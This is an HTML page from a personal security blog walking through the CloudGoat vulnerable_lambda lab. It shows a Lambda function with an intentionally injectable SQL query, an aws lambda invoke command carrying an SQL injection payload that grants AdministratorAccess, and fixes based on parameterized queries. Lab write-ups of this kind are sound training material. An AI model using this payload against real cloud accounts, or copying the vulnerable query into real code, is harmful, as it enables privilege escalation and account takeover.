@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CloudGoat Vulnerable Lambda WalkthroughThis walkthrough demonstrates how to exploit the CloudGoat vulnerable_lambda scenario using CloudTap for AWS enumeration and privilege escalation. The scenario i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CloudGoat-Vulnerable_Lambda">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="CloudGoat Vulnerable Lambda WalkthroughThis walkthrough demonstrates how to exploit the CloudGoat vulnerable_lambda scenario using CloudTap for AWS enumeration and privilege escalation. The scenario i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Vulnerable_Lambda/inline_policy.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Vulnerable_Lambda/assumed_role_policy.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Vulnerable_Lambda/policy_applier.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Vulnerable_Lambda/function_found.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Vulnerable_Lambda/database_file.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Vulnerable_Lambda/admin_access.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Vulnerable_Lambda/final_flag.png">
+<meta property="article:published_time" content="2025-06-01T23:33:31.000Z">
+<meta property="article:modified_time" content="2025-06-01T20:35:30.889Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="AWS">
+<meta property="article:tag" content="CloudGoat">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Vulnerable_Lambda/inline_policy.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>CloudGoat-Vulnerable_Lambda</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/01/Remote-LSASS-Snapshot-Dump/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&text=CloudGoat-Vulnerable_Lambda"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&title=CloudGoat-Vulnerable_Lambda"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&is_video=false&description=CloudGoat-Vulnerable_Lambda"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CloudGoat-Vulnerable_Lambda&body=Check out this article: https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&title=CloudGoat-Vulnerable_Lambda"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&title=CloudGoat-Vulnerable_Lambda"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&title=CloudGoat-Vulnerable_Lambda"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&title=CloudGoat-Vulnerable_Lambda"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&name=CloudGoat-Vulnerable_Lambda&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/06/02/CloudGoat-Vulnerable-Lambda/&t=CloudGoat-Vulnerable_Lambda"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CloudGoat-Vulnerable-Lambda-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">CloudGoat Vulnerable Lambda Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Setup"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration-with-CloudTap"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration with CloudTap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Findings"><span class="toc-number">1.2.1.</span> <span class="toc-text">Initial Findings</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lambda-Function-Analysis"><span class="toc-number">1.3.</span> <span class="toc-text">Lambda Function Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lambda-Function-Code-Analysis"><span class="toc-number">1.3.1.</span> <span class="toc-text">Lambda Function Code Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Database-Analysis"><span class="toc-number">1.3.2.</span> <span class="toc-text">Database Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-Exploitation"><span class="toc-number">1.4.</span> <span class="toc-text">SQL Injection Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability-Analysis"><span class="toc-number">1.4.1.</span> <span class="toc-text">Vulnerability Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Execution"><span class="toc-number">1.4.2.</span> <span class="toc-text">Exploit Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Injection-Explanation"><span class="toc-number">1.4.3.</span> <span class="toc-text">Injection Explanation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Success"><span class="toc-number">1.5.</span> <span class="toc-text">Privilege Escalation Success</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag-Retrieval"><span class="toc-number">1.6.</span> <span class="toc-text">Flag Retrieval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-Mitigation"><span class="toc-number">1.7.</span> <span class="toc-text">SQL Injection Mitigation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recommended-Fixes"><span class="toc-number">1.7.1.</span> <span class="toc-text">Recommended Fixes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.8.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CloudGoat-Vulnerable_Lambda
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-01T23:33:31.000Z" class="dt-published" itemprop="datePublished">2025-06-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AWS/" rel="tag">AWS</a>, <a class="p-category" href="/tags/CloudGoat/" rel="tag">CloudGoat</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="CloudGoat-Vulnerable-Lambda-Walkthrough"><a href="#CloudGoat-Vulnerable-Lambda-Walkthrough" class="headerlink" title="CloudGoat Vulnerable Lambda Walkthrough"></a>CloudGoat Vulnerable Lambda Walkthrough</h1><p>This walkthrough demonstrates how to exploit the <strong>CloudGoat vulnerable_lambda</strong> scenario using <strong>CloudTap</strong> for AWS enumeration and privilege escalation. The scenario involves exploiting an SQL injection vulnerability in a Lambda function to gain Administrator access. This CloudGoat walkthrough showcases common AWS security misconfigurations and demonstrates how tools like CloudTap can streamline the AWS penetration testing process.</p>
+<p>CloudTap is a powerful AWS enumeration tool that automates credential testing, permission discovery, and role assumption, making it invaluable for AWS security assessments and CloudGoat scenarios.</p>
+<h2 id="Initial-Setup"><a href="#Initial-Setup" class="headerlink" title="Initial Setup"></a>Initial Setup</h2><p>First, we need to whitelist our IP address and create the vulnerable Lambda environment:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create vulnerable_lambda</span><br></pre></td></tr></table></figure>
+
+<p>The command returns initial credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[cloudgoat] terraform output completed with no error code.</span><br><span class="line">cloudgoat_output_aws_account_id = [REDACTED]</span><br><span class="line">cloudgoat_output_bilbo_access_key_id = [REDACTED]</span><br><span class="line">cloudgoat_output_bilbo_secret_key = [REDACTED]</span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumeration-with-CloudTap"><a href="#Enumeration-with-CloudTap" class="headerlink" title="Enumeration with CloudTap"></a>Enumeration with CloudTap</h2><p>Configure AWS credentials and use <strong><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a></strong> to enumerate permissions:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile init</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py --keys init</span><br></pre></td></tr></table></figure>
+
+<h3 id="Initial-Findings"><a href="#Initial-Findings" class="headerlink" title="Initial Findings"></a>Initial Findings</h3><p>CloudTap reveals several key findings:</p>
+<ol>
+<li><p><strong>Inline Policy Discovery</strong>: The user has an inline policy allowing role assumption for <code>lambda-invoker</code><br><img src="/images/Vulnerable_Lambda/inline_policy.png" alt="Inline Policy"></p>
+</li>
+<li><p><strong>Assumed Role Policy</strong>: The <code>lambda-invoker</code> role has specific permissions for Lambda function operations<br><img src="/images/Vulnerable_Lambda/assumed_role_policy.png" alt="Assumed Role Policy"></p>
+</li>
+<li><p><strong>Policy Applier Role</strong>: Another role exists that can attach user policies to the <code>bilbo</code> user<br><img src="/images/Vulnerable_Lambda/policy_applier.png" alt="Policy Applier"></p>
+</li>
+</ol>
+<p>The <code>policy_applier</code> role has the following key permission:</p>
+<ul>
+<li><strong>Effect</strong>: <code>Allow</code></li>
+<li><strong>Action</strong>: <code>iam:AttachUserPolicy</code></li>
+<li><strong>Resource</strong>: Specific to the <code>cg-bilbo-cgidsyjs1yck26</code> user</li>
+</ul>
+<h2 id="Lambda-Function-Analysis"><a href="#Lambda-Function-Analysis" class="headerlink" title="Lambda Function Analysis"></a>Lambda Function Analysis</h2><p>Set up the secondary credentials (remember to include the <code>aws_session_token</code>) and run CloudTap again:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py --keys sec</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Vulnerable_Lambda/function_found.png" alt="Function Found"></p>
+<p>CloudTap automatically downloads any Lambda functions it discovers. The main function code reveals:</p>
+<h3 id="Lambda-Function-Code-Analysis"><a href="#Lambda-Function-Code-Analysis" class="headerlink" title="Lambda Function Code Analysis"></a>Lambda Function Code Analysis</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> boto3</span><br><span class="line"><span class="keyword">from</span> sqlite_utils <span class="keyword">import</span> Database</span><br><span class="line"></span><br><span class="line">db = Database(<span class="string">&quot;my_database.db&quot;</span>)</span><br><span class="line">iam_client = boto3.client(<span class="string">&#x27;iam&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    target_policys = event[<span class="string">&#x27;policy_names&#x27;</span>]</span><br><span class="line">    user_name = event[<span class="string">&#x27;user_name&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;target policys are : <span class="subst">&#123;target_policys&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> policy <span class="keyword">in</span> target_policys:</span><br><span class="line">        statement_returns_valid_policy = <span class="literal">False</span></span><br><span class="line">        statement = <span class="string">f&quot;select policy_name from policies where policy_name=&#x27;<span class="subst">&#123;policy&#125;</span>&#x27; and public=&#x27;True&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> db.query(statement):</span><br><span class="line">            statement_returns_valid_policy = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;applying <span class="subst">&#123;row[<span class="string">&#x27;policy_name&#x27;</span>]&#125;</span> to <span class="subst">&#123;user_name&#125;</span>&quot;</span>)</span><br><span class="line">            response = iam_client.attach_user_policy(</span><br><span class="line">                UserName=user_name,</span><br><span class="line">                PolicyArn=<span class="string">f&quot;arn:aws:iam::aws:policy/<span class="subst">&#123;row[<span class="string">&#x27;policy_name&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;result: &quot;</span> + <span class="built_in">str</span>(response[<span class="string">&#x27;ResponseMetadata&#x27;</span>][<span class="string">&#x27;HTTPStatusCode&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> statement_returns_valid_policy:</span><br><span class="line">            invalid_policy_statement = <span class="string">f&quot;<span class="subst">&#123;policy&#125;</span> is not an approved policy, please only choose from approved &quot;</span> \</span><br><span class="line">                                       <span class="string">f&quot;policies and don&#x27;t cheat. :) &quot;</span></span><br><span class="line">            <span class="built_in">print</span>(invalid_policy_statement)</span><br><span class="line">            <span class="keyword">return</span> invalid_policy_statement</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;All managed policies were applied as expected.&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Database-Analysis"><a href="#Database-Analysis" class="headerlink" title="Database Analysis"></a>Database Analysis</h3><p>The SQLite database contains policy information:<br><img src="/images/Vulnerable_Lambda/database_file.png" alt="Database File"></p>
+<p>Notice that <code>AdministratorAccess</code> is set to <code>False</code> in the <code>public</code> column, preventing legitimate access to this high-privilege policy.</p>
+<h2 id="SQL-Injection-Exploitation"><a href="#SQL-Injection-Exploitation" class="headerlink" title="SQL Injection Exploitation"></a>SQL Injection Exploitation</h2><h3 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h3><p>The Lambda function contains a critical SQL injection vulnerability in this line:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">statement = <span class="string">f&quot;select policy_name from policies where policy_name=&#x27;<span class="subst">&#123;policy&#125;</span>&#x27; and public=&#x27;True&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>This unparameterized query can be exploited to bypass the <code>public=&#39;True&#39;</code> condition.</p>
+<h3 id="Exploit-Execution"><a href="#Exploit-Execution" class="headerlink" title="Exploit Execution"></a>Exploit Execution</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \               </span><br><span class="line">  --function-name cgidsyjs1yck26-policy_applier_lambda1 \</span><br><span class="line">  --cli-binary-format raw-in-base64-out \</span><br><span class="line">  --payload <span class="string">&#x27;&#123;&quot;policy_names&quot;: [&quot;&#x27;</span>\&#x27;<span class="string">&#x27; OR policy_name=&#x27;</span>\&#x27;<span class="string">&#x27;AdministratorAccess&#x27;</span>\&#x27;<span class="string">&#x27; -- &quot;], &quot;user_name&quot;: &quot;cg-bilbo-cgidsyjs1yck26&quot;&#125;&#x27;</span> \</span><br><span class="line">  --region us-east-1 \</span><br><span class="line">  --profile sec \</span><br><span class="line">  output.json</span><br></pre></td></tr></table></figure>
+
+<h3 id="Injection-Explanation"><a href="#Injection-Explanation" class="headerlink" title="Injection Explanation"></a>Injection Explanation</h3><p>The malicious payload transforms the SQL query to:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> policy_name <span class="keyword">from</span> policies <span class="keyword">where</span> policy_name<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> policy_name<span class="operator">=</span><span class="string">&#x27;AdministratorAccess&#x27;</span> <span class="comment">-- &#x27; and public=&#x27;True&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>The <code>--</code> operator comments out the rest of the query</li>
+<li>The condition becomes: <code>policy_name = &#39;&#39; OR policy_name = &#39;AdministratorAccess&#39;</code></li>
+<li>This bypasses the <code>public=&#39;True&#39;</code> restriction</li>
+</ul>
+<h2 id="Privilege-Escalation-Success"><a href="#Privilege-Escalation-Success" class="headerlink" title="Privilege Escalation Success"></a>Privilege Escalation Success</h2><p>Running CloudTap again reveals the successful privilege escalation:<br><img src="/images/Vulnerable_Lambda/admin_access.png" alt="Admin Access"></p>
+<p>The <code>AdministratorAccess</code> policy is now attached to the initial user!</p>
+<h2 id="Flag-Retrieval"><a href="#Flag-Retrieval" class="headerlink" title="Flag Retrieval"></a>Flag Retrieval</h2><p>With Administrator access, we can retrieve the final flag from AWS Secrets Manager:<br><img src="/images/Vulnerable_Lambda/final_flag.png" alt="Final Flag"></p>
+<h2 id="SQL-Injection-Mitigation"><a href="#SQL-Injection-Mitigation" class="headerlink" title="SQL Injection Mitigation"></a>SQL Injection Mitigation</h2><h3 id="Recommended-Fixes"><a href="#Recommended-Fixes" class="headerlink" title="Recommended Fixes"></a>Recommended Fixes</h3><ol>
+<li><p><strong>Use Parameterized Queries</strong>: Replace string concatenation with parameterized queries</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Vulnerable code</span></span><br><span class="line">statement = <span class="string">f&quot;select policy_name from policies where policy_name=&#x27;<span class="subst">&#123;policy&#125;</span>&#x27; and public=&#x27;True&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Secure code</span></span><br><span class="line">cursor.execute(<span class="string">&quot;SELECT policy_name FROM policies WHERE policy_name = ? AND public = &#x27;True&#x27;&quot;</span>, (policy,))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Input Validation</strong>: Implement strict input validation</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_policy_name</span>(<span class="params">policy_name</span>):</span><br><span class="line">    <span class="comment"># Only allow alphanumeric characters, hyphens, and underscores</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[a-zA-Z0-9_-]+$&#x27;</span>, policy_name):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid policy name format&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> policy_name</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Use ORM</strong>: Consider using an ORM like SQLAlchemy that provides built-in protection</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> text</span><br><span class="line"></span><br><span class="line"><span class="comment"># Secure parameterized query</span></span><br><span class="line">result = session.execute(</span><br><span class="line">    text(<span class="string">&quot;SELECT policy_name FROM policies WHERE policy_name = :policy AND public = &#x27;True&#x27;&quot;</span>),</span><br><span class="line">    &#123;<span class="string">&quot;policy&quot;</span>: policy&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Principle of Least Privilege</strong>: Limit Lambda execution role permissions to only what’s necessary</p>
+</li>
+<li><p><strong>Code Review</strong>: Implement mandatory security code reviews for all Lambda functions</p>
+</li>
+</ol>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This CloudGoat walkthrough demonstrates how SQL injection vulnerabilities in Lambda functions can lead to complete AWS account compromise. The scenario highlights the importance of:</p>
+<ul>
+<li>Secure coding practices in serverless environments</li>
+<li>Proper input validation and parameterized queries</li>
+<li>Regular security assessments using tools like <strong><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a></strong></li>
+<li>Implementing the principle of least privilege</li>
+</ul>
+<p>CloudTap proved invaluable in this assessment by automating the enumeration process, discovering permissions, and automatically assuming roles, significantly speeding up the penetration testing workflow for this CloudGoat lambda scenario.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CloudGoat-Vulnerable-Lambda-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">CloudGoat Vulnerable Lambda Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Setup"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration-with-CloudTap"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration with CloudTap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Findings"><span class="toc-number">1.2.1.</span> <span class="toc-text">Initial Findings</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lambda-Function-Analysis"><span class="toc-number">1.3.</span> <span class="toc-text">Lambda Function Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lambda-Function-Code-Analysis"><span class="toc-number">1.3.1.</span> <span class="toc-text">Lambda Function Code Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Database-Analysis"><span class="toc-number">1.3.2.</span> <span class="toc-text">Database Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-Exploitation"><span class="toc-number">1.4.</span> <span class="toc-text">SQL Injection Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability-Analysis"><span class="toc-number">1.4.1.</span> <span class="toc-text">Vulnerability Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Execution"><span class="toc-number">1.4.2.</span> <span class="toc-text">Exploit Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Injection-Explanation"><span class="toc-number">1.4.3.</span> <span class="toc-text">Injection Explanation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Success"><span class="toc-number">1.5.</span> <span class="toc-text">Privilege Escalation Success</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag-Retrieval"><span class="toc-number">1.6.</span> <span class="toc-text">Flag Retrieval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-Mitigation"><span class="toc-number">1.7.</span> <span class="toc-text">SQL Injection Mitigation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recommended-Fixes"><span class="toc-number">1.7.1.</span> 